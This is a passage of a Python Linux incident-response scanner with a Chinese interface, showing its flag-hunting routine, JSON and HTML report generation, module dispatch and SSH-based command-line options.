                        hits.append({
                            'flag': flag_str,
                            'module': mod_name,
                            'key': sub_key,
                            'line': line_text,
                        })

        # 也从 findings 中收集 Flag 类别
        for f in self.findings:
            if f.get('category') == 'Flag' and f.get('evidence'):
                for pat in FLAG_PATTERNS:
                    for m in pat.finditer(f['evidence']):
                        flag_str = m.group(0)
                        if flag_str not in seen:
                            seen.add(flag_str)
                            hits.append({
                                'flag': flag_str,
                                'module': 'findings',
                                'key': f['description'][:60],
                                'line': f['evidence'][:300],
                            })

        return hits

    # ============================================================
    # 文件输出
    # ============================================================
    def save_json(self, filepath):
        flag_hits = self._flag_hunt()
        payload = {
            'meta': self.results.get('__meta__', {
                'target': '%s:%s' % (self.host, self.port),
                'user': self.user,
                'scan_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'duration_sec': round(self.scan_duration, 1),
            }),
            'modules': {k: v for k, v in self.results.items() if k != '__meta__'},
            'findings': self.findings,
            'flag_hunt': flag_hits,
        }
        with open(filepath, 'w', encoding='utf-8') as fh:
            json.dump(payload, fh, ensure_ascii=False, indent=2)
        print(C.green("[+] JSON 报告已保存: %s" % filepath))

    def save_html(self, filepath):
        meta = self.results.get('__meta__', {})
        score = meta.get('risk_score', 0)
        level = meta.get('risk_level', '未知')
        counts = meta.get('severity_counts', {'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0})

        def esc(s):
            s = str(s)
            s = s.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            return s.replace('"', '&quot;').replace("'", '&#39;')

        sev_color = {'HIGH': '#ff4444', 'MEDIUM': '#ffaa00',
                     'LOW': '#44aaff', 'INFO': '#44ff88'}

        # 发现列表
        find_rows = []
        for f in self.findings:
            c = sev_color.get(f['severity'], '#888')
            find_rows.append(
                '<tr><td style="color:%s;font-weight:bold">%s</td>'
                '<td>%s</td><td>%s</td><td><pre style="margin:0;white-space:pre-wrap;'
                'word-break:break-all;max-height:120px;overflow:auto">%s</pre></td>'
                '<td style="color:#888">%s</td></tr>' % (
                    c, f['severity'], esc(f['category']),
                    esc(f['description']), esc(f['evidence']), f['time']))

        # 模块摘要
        mod_key_map = {
            1: 'system_info', 2: 'network', 3: 'users', 4: 'processes',
            5: 'scheduled_tasks', 6: 'startup', 7: 'filesystem',
            8: 'hidden_flags', 9: 'bash_history', 10: 'web_logs',
            11: 'webshell', 12: 'database', 13: 'ssh_security',
            14: 'pcap', 15: 'malware', 16: 'rootkit', 17: 'docker',
        }
        mod_cards = []
        for num in range(1, 18):
            if num not in MODULES:
                continue
            name, title = MODULES[num]
            key = mod_key_map.get(num)
            if not key:
                continue
            sections = []
            for k in sorted(self.results.keys()):
                if k == key or k.startswith(key + ':'):
                    sections.append(k)
            blocks = []
            for sk in sections:
                data = self.results.get(sk, {})
                if isinstance(data, dict):
                    for sub_k, sub_v in data.items():
                        blocks.append((sub_k, sub_v))
                else:
                    blocks.append((sk, data))
            body = ''
            for sub_k, sub_v in blocks:
                body += (
                    '<div class="sub"><b>%s</b>'
                    '<pre style="%s">%s</pre></div>' % (
                        esc(sub_k),
                        'white-space:pre-wrap;word-break:break-word;'
                        'max-height:300px;overflow:auto;color:#c8d3e0',
                        esc(sub_v)))
            mod_cards.append(
                '<div class="mod"><details><summary><b>[%02d] %s</b> '
                '<span class="cnt">%d 项</span></summary>'
                '<div class="modbody">%s</div></details></div>' % (
                    num, title, len(blocks), body or '<i>无数据</i>'))

        # Flag 汇总 (HTML)
        flag_hits_html = self._flag_hunt()
        flag_rows_html = []
        for item in flag_hits_html:
            flag_rows_html.append(
                '<tr><td style="color:#44ff88;font-weight:bold">%s</td>'
                '<td>%s</td><td>%s</td>'
                '<td><pre style="margin:0;white-space:pre-wrap;word-break:break-all;'
                'max-height:80px;overflow:auto">%s</pre></td></tr>' % (
                    esc(item['flag']), esc(item['module']),
                    esc(item['key']), esc(item['line'])))
        flag_table_html = ''.join(flag_rows_html) or '<tr><td colspan="4" style="text-align:center;color:#8b949e">未发现 flag</td></tr>'

        html = '''<!DOCTYPE html>
<html lang="zh-CN"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Linux 应急响应扫描报告 - {target}</title>
<style>
* {{ box-sizing:border-box; }}
body {{ background:#0d1117; color:#c9d1d9; font-family:'Segoe UI',Consolas,
  'Microsoft YaHei',sans-serif; margin:0; padding:20px; }}
h1 {{ color:#58a6ff; border-bottom:1px solid #30363d; padding-bottom:10px; }}
.meta {{ background:#161b22; border:1px solid #30363d; border-radius:8px;
  padding:16px 20px; margin-bottom:20px; }}
.meta table {{ border-collapse:collapse; }}
.meta td {{ padding:4px 12px; }}
.meta td.k {{ color:#8b949e; }}
.score {{ font-size:48px; font-weight:bold; }}
.cards {{ display:flex; gap:12px; margin:20px 0; flex-wrap:wrap; }}
.card {{ flex:1; min-width:120px; background:#161b22; border:1px solid #30363d;
  border-radius:8px; padding:16px; text-align:center; }}
.card .num {{ font-size:32px; font-weight:bold; }}
.card .lbl {{ color:#8b949e; font-size:13px; margin-top:4px; }}
h2 {{ color:#58a6ff; margin-top:30px; }}
table {{ width:100%; border-collapse:collapse; margin:10px 0; }}
th,td {{ border:1px solid #30363d; padding:8px; text-align:left;
  vertical-align:top; font-size:13px; }}
th {{ background:#21262d; color:#58a6ff; }}
.mod {{ background:#161b22; border:1px solid #30363d; border-radius:6px;
  margin:8px 0; }}
.mod summary {{ cursor:pointer; padding:10px 14px; font-size:14px; }}
.mod summary:hover {{ background:#21262d; }}
.modbody {{ padding:6px 14px 14px; }}
.sub {{ margin:8px 0; }}
.sub b {{ color:#79c0ff; font-size:13px; }}
.cnt {{ color:#8b949e; font-size:12px; }}
pre {{ background:#0d1117; border:1px solid #30363d; border-radius:4px;
  padding:8px; font-size:12px; line-height:1.5; }}
</style></head><body>
<h1>Linux 应急响应扫描报告</h1>
<div class="meta">
<table>
<tr><td class="k">目标主机</td><td>{target}</td>
    <td class="k">登录用户</td><td>{user}</td></tr>
<tr><td class="k">扫描时间</td><td>{scantime}</td>
    <td class="k">扫描耗时</td><td>{duration} 秒</td></tr>
<tr><td class="k">是否 Root</td><td>{isroot}</td>
    <td class="k">Web 根目录</td><td>{webroots}</td></tr>
</table>
</div>
<div class="cards">
<div class="card"><div class="score" style="color:#58a6ff">{score}</div>
  <div class="lbl">风险评分 / 100</div></div>
<div class="card"><div class="num" style="color:#ffa657">{level}</div>
  <div class="lbl">风险等级</div></div>
<div class="card"><div class="num" style="color:#ff4444">{high}</div>
  <div class="lbl">高危 HIGH</div></div>
<div class="card"><div class="num" style="color:#ffaa00">{medium}</div>
  <div class="lbl">中危 MEDIUM</div></div>
<div class="card"><div class="num" style="color:#44aaff">{low}</div>
  <div class="lbl">低危 LOW</div></div>
<div class="card"><div class="num" style="color:#44ff88">{info}</div>
  <div class="lbl">信息 INFO</div></div>
</div>
<h2>发现列表 ({total})</h2>
<table><tr><th>级别</th><th>类别</th><th>描述</th><th>证据</th><th>时间</th></tr>
{findrows}</table>
<h2>模块详情</h2>
{modcards}
<h2>Flag 汇总 ({flagcount})</h2>
{flagtable}
<p style="color:#8b949e;margin-top:30px;text-align:center">
Generated by IR Scanner v1.3 &middot; {scantime}</p>
</body></html>'''.format(
            target=esc(meta.get('target', '%s:%s' % (self.host, self.port))),
            user=esc(self.user),
            scantime=meta.get('scan_time', datetime.now().strftime('%Y-%m-%d %H:%M:%S')),
            duration=meta.get('duration_sec', round(self.scan_duration, 1)),
            isroot='是' if meta.get('is_root') else '否',
            webroots=esc(', '.join(meta.get('webroots', self.webroots)) or '未检测'),
            score=score, level=level,
            high=counts.get('HIGH', 0), medium=counts.get('MEDIUM', 0),
            low=counts.get('LOW', 0), info=counts.get('INFO', 0),
            total=len(self.findings),
            findrows=''.join(find_rows) or '<tr><td colspan="5" style="text-align:center;color:#8b949e">无发现</td></tr>',
            modcards=''.join(mod_cards) or '<i>无模块数据</i>',
            flagcount=len(flag_hits_html),
            flagtable='<table><tr><th>Flag</th><th>来源模块</th><th>结果 Key</th><th>所在行</th></tr>%s</table>' % flag_table_html,
        )
        with open(filepath, 'w', encoding='utf-8') as fh:
            fh.write(html)
        print(C.green("[+] HTML 报告已保存: %s" % filepath))

    # ============================================================
    # 调度
    # ============================================================
    def _run_module(self, num):
        if num not in MODULES:
            print(C.red("[!] 未知模块号: %s" % num))
            return
        name, title = MODULES[num]
        self._sec(num, title)
        try:
            getattr(self, name)()
        except Exception as e:
            print(C.red("[!] 模块 %s 出错: %s" % (title, e)))
            self.results.setdefault('errors', {})[name] = str(e)

    def full_scan(self):
        try:
            self.connect()
            self._detect_webroot()
            if self.webroots:
                print(C.cyan("[*] 检测到 Web 根目录: %s\n" % ', '.join(self.webroots)))
            for num in range(1, 18):
                self._run_module(num)
            self.analyze_anomalies()
            self._run_module(18)
        finally:
            self.close()

    def run_modules(self, mod_nums):
        mod_nums = sorted(set(int(m) for m in mod_nums))
        try:
            self.connect()
            if any(m in range(7, 13) for m in mod_nums):
                self._detect_webroot()
                if self.webroots:
                    print(C.cyan("[*] 检测到 Web 根目录: %s\n" % ', '.join(self.webroots)))
            for num in mod_nums:
                self._run_module(num)
            if 18 not in mod_nums:
                self.analyze_anomalies()
        finally:
            self.close()


# ============================================================
# CLI
# ============================================================
def main():
    parser = argparse.ArgumentParser(
        description="Linux 自动化应急响应扫描器 (18 模块)",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument('-H', '--host', required=True, help='目标主机 IP')
    parser.add_argument('-p', '--port', type=int, default=22, help='SSH 端口 (默认 22)')
    parser.add_argument('-U', '--user', required=True, help='SSH 用户名')
    parser.add_argument('-P', '--password', required=True, help='SSH 密码')
    parser.add_argument('--webroot', help='指定 Web 根目录 (可多个, 逗号分隔)')
    parser.add_argument('--timeout', type=int, default=30, help='SSH/命令超时秒数 (默认 30)')
    parser.add_argument('--json', metavar='FILE', help='输出 JSON 报告到文件')
    parser.add_argument('--report', metavar='FILE', help='输出 HTML 报告到文件')
    parser.add_argument('--modules', help='仅运行指定模块 (逗号分隔, 如 1,2,3,8)')
    args = parser.parse_args()

    banner()

    wr = args.webroot
    if wr and ',' in wr:
        wr = wr.split(',')[0].strip()  # 第一个作为主 webroot, 其余在探测中补充

    scanner = IRScanner(
        host=args.host, port=args.port, user=args.user,
        password=args.password, webroot=wr, timeout=args.timeout,
    )

    if args.webroot and ',' in args.webroot:
        extra = [w.strip() for w in args.webroot.split(',') if w.strip()][1:]
        scanner.webroots = extra  # 将在 _detect_webroot 中合并

    if args.modules:
        try:
            mods = [int(m.strip()) for m in args.modules.split(',') if m.strip()]
        except ValueError:
            print(C.red("[!] --modules 参数需为逗号分隔的数字"))
            sys.exit(1)
        scanner.run_modules(mods)
    else:
        scanner.full_scan()

    if args.json:
        try:
            scanner.save_json(args.json)
        except Exception as e:
            print(C.red("[!] 保存 JSON 失败: %s" % e))
    if args.report:
        try:
            scanner.save_html(args.report)
        except Exception as e:
            print(C.red("[!] 保存 HTML 失败: %s" % e))


if __name__ == '__main__':
    main()
